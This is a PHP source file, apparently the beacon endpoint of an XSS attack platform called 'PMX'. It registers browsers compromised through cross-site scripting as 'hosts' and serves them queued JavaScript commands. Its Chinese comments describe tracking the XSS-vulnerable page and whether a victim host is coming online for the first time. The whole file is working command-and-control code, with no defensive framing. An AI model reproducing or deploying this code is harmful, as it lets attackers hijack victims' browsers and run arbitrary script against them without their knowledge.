<?php
/** Prevent user from loading inc. file */
define ( "PMX_ENTRANCE", true );

require (dirname ( __FILE__ ) . '/public-init.php');

$current_url = get_url ();
$URI = substr ( $current_url, strlen ( PMX_SITEURL ), strlen ( $current_url ) - strlen ( PMX_SITEURL ) );
$uri = explode ( '/', $URI );
$saltid = substr ( $uri [2], 0, 8 ); // 项目字符串ID
if (count ( $uri ) < 4) {
	header ( 'Content-Type: text/javascript; charset=utf-8' );
	die ( "/*null*/" );
}
if (strlen ( $uri [3] ) != 50) {
	header ( 'Content-Type: text/javascript; charset=utf-8' );
	die ( "/*null*/" );
}

$sid = $uri [3]; // XSS漏洞页字符串ID
$pmxProj = new pmxProject ();
$pmxHost = new pmxHost ();
if ($pmxProj->isExistSaltID ( $saltid ) == FALSE) {
	header ( 'Content-Type: text/javascript; charset=utf-8' );
	die ( "/*null*/" );
}
$pid = $pmxProj->getIDbySlatID ( $saltid );
/**
 * 判断是否第一次上线
 */
if ($pmxHost->isExistSaltID ( $sid ) == FALSE) {
	$pmxHost->addHost ( $pid, $sid ); // 添加主机
} else {
	$pmxHost->updateHost ( $sid ); // 更新主机信息
}
$command = $pmxHost->getCommand ( $sid );
if ($command) {
	header ( 'Content-Type: text/javascript; charset=utf-8' );
	echo $command;
}
